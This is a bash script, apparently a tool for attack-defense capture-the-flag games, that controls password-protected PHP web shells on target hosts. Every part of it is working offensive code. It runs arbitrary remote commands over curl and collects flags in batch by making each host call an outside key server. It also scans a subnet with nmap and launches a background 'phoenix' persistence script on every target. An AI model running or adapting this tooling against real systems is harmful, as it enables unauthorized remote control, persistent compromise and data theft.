#!  /bin/bash

passwd="p4rr0t"
target="http://127.0.0.1/.api.php"
segment="4.4.*.100-101"


function readAllFlag(){
    echo -n "Input path of flag>"
    read path
    cmd='curl http://192.168.100.1/Getkey'
    for target in $(cat ./target.txt)
    do
        shellExec $target $cmd
        echo $target: >> flag.txt
        shellExec $target $cmd >> flag.txt 
    done
    echo "---------------------------"
}

function urlencode(){
    echo $1|sed 's/[ ] [ ]*/ /g'|sed 's/ [ ]*/%20/g'
}

#$1 is target
function shellExec(){
    echo $cmd
    curl -d "pass=$passwd&shell=$cmd" $1 -s
}

function getPath(){
    path=`curl -d "pass=$passwd&a=echo exec('pwd');" $1 -s`
    user=`curl -d "pass=$passwd&a=echo exec('whoami');" $1 -s`
    echo -e -n "\033[35m$user\033[0m@\033[36m$path>\033[0m"
}

function phpEval(){
    curl -d "pass=$passwd&a=$2" $1
}

function phoenix(){
    logInfo "1. Single"
    logInfo "2. Batch"
    echo -e -n "\033[35m>\033[0m"
    read choice
    case $choice in
        1)
            logInfo "Input Target>"
            read target
            cmd='php phoenix.php &'
            shellExec $target $cmd
            ;;
        2)
            i=1
            hosts=$(cat target.txt)
            for target in $hosts
            do
                cmd='php phoenix.php &'
                logInfo "$i. $target"
                i=$((i+1))
                shellExec $target $cmd
            done
            ;;
        *)
            echo "Error Choice"
            ;;
    esac
}

function commandMode(){
    logInfo "Input Target url>"
    read target
    while [[ 1 ]]
    do
        getPath $target
        read cmd
        if [[ $cmd == "exit" ]]
        then 
            break
            echo $cmd
        fi
        shellExec $target $cmd
    done
}

function segmentScan(){
    logInfo "Scanning "$segment'...'
    nmap -sP $segment -vv -o seg.log
}

function table(){
    logInfo "1. CommandMode"
    logInfo "2. ReadAllFlag"
    logInfo "3. SegmentScan"
    logInfo "4. Phoenix"
    logInfo "5. Exit"
    echo -e -n "\033[35m>\033[0m"
}

function logo(){
    logoFont '    ____   __ __               ____   __ ' 
    logoFont '   / __ \ / // /  _____ _____ / __ \ / /_'
    logoFont '  / /_/ // // /_ / ___// ___// / / // __/'
    logoFont ' / ____//__  __// /   / /   / /_/ // /_  '
    logoFont '/_/       /_/  /_/   /_/    \____/ \__/  '
}

function logoFont(){
    echo -e "\033[34m$1\033[0m"
}

function logInfo(){
    echo -e "\033[35m[+]\033[0m\033[36m$1\033[0m"
}

function main(){
    while [[ 1 ]]
    do
        table
        read choice
        case $choice in
            1)
                commandMode
            ;;
            2)
                readAllFlag
            ;;
            3)
                segmentScan
            ;;
            4)
                phoenix
            ;;
            5)
                break
            ;;
            *)
                echo "Error Choice"
            ;;
        esac
    done
}

logo
main
